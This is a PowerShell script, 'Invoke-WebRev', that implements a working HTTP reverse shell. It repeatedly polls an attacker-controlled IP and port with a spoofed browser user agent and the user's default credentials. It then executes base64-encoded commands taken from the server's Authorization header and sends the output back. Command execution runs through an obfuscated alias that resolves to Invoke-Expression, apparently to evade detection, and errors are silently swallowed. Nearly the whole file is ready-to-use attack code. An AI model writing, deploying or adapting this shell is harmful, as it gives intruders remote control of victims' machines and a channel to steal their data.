function Invoke-WebRev{
    param
    (
        [string]$ip,
        [string]$port
    )

    $help=@"

.SYNOPSIS
    WebRev.
    PowerShell Function: Invoke-WebRev
    Author: Hector de Armas (3v4Si0N)

    Dependencias Requeridas: Ninguna
    Dependencias Opcionales: Ninguna
.DESCRIPTION
    .
.EXAMPLE
    Invoke-Webrev -ip 192.168.29.131 -port 80
"@

    if(-not $ip -or -not $port) { return $help; }

    $url="http://" + $ip + ":" + $port + "/";
    $postParams = @{result='start'};
    $x = "cabesha-ei-chixaka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])

    while (1 -eq 1)
    {
        try
        {
            $req = Invoke-WebRequest $url -Method POST -Body $postParams -UseDefaultCredentials -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
            $header = $req.Headers["Authorization"];
            $d = [System.Convert]::FromBase64String($header);
            $Ds = [System.Text.Encoding]::UTF8.GetString($d);
            $result = "";

            Foreach ($string in cabesha-ei-chixaka $Ds)
            {
                $result += '_n1w_' + $string;
            };
            $result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result));
            $postParams = @{result=$result};
        }catch {};
    };
}

#Invoke-WebRev -ip 192.168.29.131 -port 80